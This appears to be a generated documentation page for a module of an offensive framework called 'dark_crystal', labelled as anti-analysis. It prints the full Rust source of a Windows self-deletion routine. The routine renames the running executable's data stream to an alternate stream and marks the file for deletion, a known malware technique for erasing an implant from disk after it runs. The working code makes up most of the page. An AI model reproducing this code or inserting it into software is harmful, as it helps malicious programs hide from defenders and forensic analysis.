# self_deletion

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/self_deletion.rs` |
| **Lines** | 90 |
| **Cards** | T013-anti-analysis |
| **Role** | Self-deletion |
| **Unsafe blocks** | 1 |

## Public API

### `delete_self` (line 14)
```rust
pub fn delete_self() -> anyhow::Result<()>
```

## Key Dependencies

- `use windows::core::PCWSTR;`
- `use windows::Win32::{`

## Full Source

```rust
use std::ffi::c_void;
use std::mem::size_of;
use windows::core::PCWSTR;
use windows::Win32::{
    Foundation::CloseHandle,
    Storage::FileSystem::{CreateFileW, SetFileInformationByHandle, FILE_RENAME_INFO},
    Storage::FileSystem::{
        FileDispositionInfo, FileRenameInfo, DELETE, FILE_DISPOSITION_INFO,
        FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_READ, OPEN_EXISTING, SYNCHRONIZE,
    },
    System::Memory::{GetProcessHeap, HeapAlloc, HeapFree, HEAP_FLAGS, HEAP_ZERO_MEMORY},
};

pub fn delete_self() -> anyhow::Result<()> {
    let stream = ":victor";
    let stream_wide = stream.encode_utf16().chain(Some(0)).collect::<Vec<u16>>();

    unsafe {
        let mut delete_file = FILE_DISPOSITION_INFO::default();
        let lenght = size_of::<FILE_RENAME_INFO>() + (stream_wide.len() * size_of::<u16>());
        let rename_info =
            HeapAlloc(GetProcessHeap()?, HEAP_ZERO_MEMORY, lenght) as *mut FILE_RENAME_INFO;
        if rename_info.is_null() {
            return Err(anyhow::anyhow!(
                "HeapAlloc failed while preparing FILE_RENAME_INFO"
            ));
        }

        delete_file.DeleteFile = true.into();
        (*rename_info).FileNameLength = (stream_wide.len() * size_of::<u16>()) as u32 - 2;

        std::ptr::copy_nonoverlapping(
            stream_wide.as_ptr(),
            (*rename_info).FileName.as_mut_ptr(),
            stream_wide.len(),
        );

        let path = std::env::current_exe()?;
        let path_str = path
            .to_str()
            .ok_or_else(|| anyhow::anyhow!("Error when converting to str"))?;
        let full_path = path_str.encode_utf16().chain(Some(0)).collect::<Vec<u16>>();

        let mut h_file = CreateFileW(
            PCWSTR(full_path.as_ptr()),
            DELETE.0 | SYNCHRONIZE.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(0),
            None,
        )?;

        SetFileInformationByHandle(
            h_file,
            FileRenameInfo,
            rename_info as *const c_void,
            lenght as u32,
        )?;

        CloseHandle(h_file)?;

        h_file = CreateFileW(
            PCWSTR(full_path.as_ptr()),
            DELETE.0 | SYNCHRONIZE.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(0),
            None,
        )?;

        SetFileInformationByHandle(
            h_file,
            FileDispositionInfo,
            &delete_file as *const FILE_DISPOSITION_INFO as _,
            std::mem::size_of_val(&delete_file) as u32,
        )?;

        CloseHandle(h_file)?;

        HeapFree(
            GetProcessHeap()?,
            HEAP_FLAGS(0),
            Some(rename_info as *const c_void),
        )?;
    }

    Ok(())
}

```